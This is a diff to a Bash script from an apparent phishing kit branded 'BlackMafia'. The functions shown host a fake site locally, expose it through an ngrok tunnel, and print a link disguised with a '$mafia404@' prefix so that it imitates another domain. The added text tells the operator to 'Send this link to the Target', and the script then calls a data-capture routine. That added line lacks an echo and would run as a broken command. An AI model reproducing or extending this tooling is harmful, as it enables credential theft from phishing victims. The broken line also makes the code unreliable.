@@ -247,7 +247,7 @@ capture_data() {
 
 ## Start ngrok
 start_ngrok() {
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} BlackMafia Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} BlackMafia server... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} $2"
 	sleep 2 && ./.server/"$1" http "$HOST":"$PORT" > /dev/null 2>&1 &
@@ -256,12 +256,13 @@ start_ngrok() {
 	ngrok_url1=${ngrok_url#https://}
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mafia404@$ngrok_url1"
+${RED} Send this link to the Target
 	capture_data
 }
 
 ## Start localhost
 start_localhost() {
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} BlackMafia Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} BlackMafia Server... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	setup_site
 	{ sleep 1; clear; banner_mafia; }
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
